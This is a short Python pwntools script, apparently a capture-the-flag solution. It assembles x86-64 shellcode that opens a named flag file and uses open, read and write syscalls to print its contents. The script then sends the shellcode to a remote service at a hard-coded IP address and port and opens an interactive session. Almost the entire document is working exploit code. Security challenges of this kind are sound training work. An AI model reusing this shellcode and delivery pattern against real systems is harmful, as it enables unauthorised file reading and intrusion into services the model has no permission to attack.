from platform import architecture
from pwn import *

# 'push %d' % u64('t\0\0\0'),
    # 'push %d' % u64('n.tx'), -> 0x000000007478742e
    # 'push %d' % u64('CoDo'),
    # 'push %d' % u64('hong'), -> 0x6e6f446f43676e6f
    # 'push %d' % u64('PhaK'),
    # 'push %d' % u64('PhaP'), -> 0x684b616850616850

	# sys_open -> sys_read -> sys_write
shellcode = asm('''
    mov r8, 0x000000007478742e
    mov r9, 0x6e6f446f43676e6f
    mov r10, 0x684b616850616850
	push r8
	push r9
	push r10
    xor rdx, rdx
    xor rsi, rsi
    mov rdi, rsp
	mov rax, 0x2
    syscall
	mov rdi,rax
	mov rsi, rsp
	mov rdx, 0x100
	mov rax, 0x0
	syscall
	mov rdi, 0x1
	mov rdx, rax
	mov rax, 0x1
	syscall''',arch="amd64", bits=64)

p = remote("45.122.249.68", 10017)
p.sendline(shellcode)
p.interactive()